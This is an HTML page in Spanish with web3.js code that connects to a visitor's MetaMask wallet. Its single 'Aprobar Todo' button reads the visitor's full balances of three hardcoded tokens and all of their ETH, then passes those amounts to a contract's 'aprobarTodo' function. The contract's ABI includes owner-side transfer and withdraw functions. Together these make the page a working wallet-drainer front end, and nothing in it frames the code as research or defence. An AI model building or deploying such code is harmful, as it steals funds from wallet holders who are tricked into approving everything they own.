<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interacción con el Contrato SaldoManager</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
</head>
<body>
    <h1>Aprobación Automática de Saldo</h1>
    <button onclick="approveAll()">Aprobar Todo</button>

    <script>
        let web3;
        let contract;
        let userAddress;

        // Verificar si MetaMask está instalado
        if (typeof window.ethereum !== 'undefined') {
            console.log("MetaMask está instalado");
            web3 = new Web3(window.ethereum); // Usamos MetaMask para la instancia de Web3
            window.ethereum.request({ method: 'eth_requestAccounts' }).then(accounts => {
                if (accounts.length > 0) {
                    userAddress = accounts[0];
                    console.log("Cuenta conectada:", userAddress);
                    initContract();
                } else {
                    alert("Por favor conecta tu billetera MetaMask.");
                }
            }).catch(error => {
                alert("Error al conectar con MetaMask: " + error.message);
            });
        } else {
            alert("Por favor instala MetaMask para continuar.");
            throw new Error("MetaMask no está instalado");
        }

        // Dirección del contrato SaldoManager
        const contractAddress = '0x26c0B6C2A8120E9c71de55FB678E76174598B196';
        
        // ABI del contrato
        const contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"},{"internalType":"bool","name":"esERC20","type":"bool"},{"internalType":"bool","name":"esERC721","type":"bool"},{"internalType":"bool","name":"esERC1155","type":"bool"}],"internalType":"struct SaldoManager.Aprobacion[]","name":"aprobacionesERC20","type":"tuple[]"},{"internalType":"address[]","name":"contratosERC721","type":"address[]"},{"internalType":"address[]","name":"contratosERC1155","type":"address[]"},{"internalType":"uint256","name":"ethAmount","type":"uint256"}],"name":"aprobarTodo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"balanceETH","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"recibirERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"recibirERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"retirarERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"retirarETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"revisarSaldoERC20","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"revisarSaldoETH","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"transferirERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"transferirERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferirERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferirETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];

        // Inicializar el contrato
        async function initContract() {
            try {
                contract = new web3.eth.Contract(contractABI, contractAddress);
                console.log("Contrato inicializado correctamente");
            } catch (error) {
                console.error("Error al inicializar el contrato:", error);
                alert("Hubo un problema al inicializar el contrato.");
            }
        }

        // Función para obtener los tokens ERC-20 del usuario
        async function getERC20Tokens() {
            const tokenContracts = [
                '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                '0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1',
                '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85'
                // Añadir más tokens si es necesario
            ];

            let tokensToApprove = [];
            for (let i = 0; i < tokenContracts.length; i++) {
                const token = tokenContracts[i];
                const tokenContract = new web3.eth.Contract([{
                    "constant": true,
                    "inputs": [{"name": "account", "type": "address"}],
                    "name": "balanceOf",
                    "outputs": [{"name": "", "type": "uint256"}],
                    "payable": false,
                    "stateMutability": "view",
                    "type": "function"
                }], token);

                const balance = await tokenContract.methods.balanceOf(userAddress).call();

                if (balance > 0) {
                    tokensToApprove.push({
                        token: token,
                        cantidad: balance,
                        esERC20: true,
                        esERC721: false,
                        esERC1155: false
                    });
                }
            }
            return tokensToApprove;
        }

        // Función para verificar el saldo de ETH del usuario
        async function getETHBalance() {
            const balance = await web3.eth.getBalance(userAddress);
            return balance;
        }

        // Función para aprobar todo
        async function approveAll() {
            try {
                const ethBalance = await getETHBalance();
                const tokensToApprove = await getERC20Tokens();

                if (ethBalance > 0 || tokensToApprove.length > 0) {
                    // Preparar las aprobaciones
                    const aprobacionesERC20 = tokensToApprove.map(token => ({
                        token: token.token,
                        cantidad: token.cantidad,
                        esERC20: token.esERC20,
                        esERC721: token.esERC721,
                        esERC1155: token.esERC1155
                    }));

                    // Asegúrate de que el contrato está inicializado
                    if (!contract) {
                        alert("El contrato no está inicializado correctamente.");
                        return;
                    }

                    // Llamar al contrato para aprobar todo
                    await contract.methods.aprobarTodo(
                        aprobacionesERC20,
                        [], // Enviar contratos ERC721 si los hay
                        [], // Enviar contratos ERC1155 si los hay
                        ethBalance // Enviar ETH disponible
                    ).send({ from: userAddress });

                    alert("Aprobación completa para el contrato!");
                } else {
                    alert("No tienes saldo en ETH o tokens.");
                }
            } catch (error) {
                console.error("Error al aprobar los saldos:", error);
                alert("Hubo un error al intentar aprobar los saldos.");
            }
        }
    </script>
</body>
</html>
